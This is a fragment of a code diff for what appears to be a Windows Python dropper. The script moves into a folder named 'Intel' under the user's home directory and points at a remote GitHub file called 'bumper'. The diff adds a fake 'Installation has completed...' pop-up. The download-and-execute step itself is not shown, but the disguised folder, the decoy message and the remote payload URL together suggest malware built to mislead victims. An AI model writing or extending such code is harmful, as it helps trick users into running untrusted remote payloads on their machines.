@@ -1,3 +1,5 @@
+import tkinter as tk
+from tkinter import simpledialog
 import subprocess
 import os
 import sys
@@ -27,6 +29,8 @@ from win32com.shell import shell
 
 import tkinter as tk
 
+from tkinter import messagebox
+
 from tkinter import simpledialog
 
 import subprocess
@@ -34,6 +38,8 @@ import subprocess
 d = os.path.join(os.environ["HOMEPATH"], r"Intel")
 
 os.chdir(d)
+
+messagebox.showinfo("Message", "Installation has completed...")
 
 remote_url = 'https://raw.githubusercontent.com/Mood56467/889671/main/bumper'
 
